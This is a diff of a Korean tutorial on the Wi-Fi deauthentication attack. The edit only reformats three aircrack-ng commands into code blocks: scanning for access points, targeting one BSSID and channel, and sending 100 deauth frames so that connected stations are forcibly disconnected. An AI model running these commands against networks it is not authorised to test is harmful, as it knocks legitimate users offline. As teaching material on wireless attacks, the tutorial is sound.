@@ -77,7 +77,9 @@ MDK3, Void11, Scapy 및 Zulu 소프트웨어도 **Deauthentication Attack**을 �
 
 **[그림 4] 무선랜을 통해 확인하는 AP와 station**  
 
-```airodump-ng wlan0```  
+```
+airodump-ng wlan0
+```  
 
 
 
@@ -85,7 +87,9 @@ MDK3, Void11, Scapy 및 Zulu 소프트웨어도 **Deauthentication Attack**을 �
 
   **[그림 5] 타겟 AP에 연결된 station**  
 
-```airodump-ng --bssid 00:26:66:66:29:A8 –c 13 wlan0```  
+```
+airodump-ng --bssid 00:26:66:66:29:A8 –c 13 wlan0
+```  
 
 
 
@@ -93,7 +97,9 @@ MDK3, Void11, Scapy 및 Zulu 소프트웨어도 **Deauthentication Attack**을 �
 
 **[그림 6] 공격 수행 모습**  
 
-```aireplay-ng --deauth 100 –a 00:26:66:66:29:A8 wlan0```  
+```
+aireplay-ng --deauth 100 –a 00:26:66:66:29:A8 wlan0
+```  
 
 해당 공격을 통하여 AP에 연결된 station들은 강제적으로 연결이 해제된다.   
 
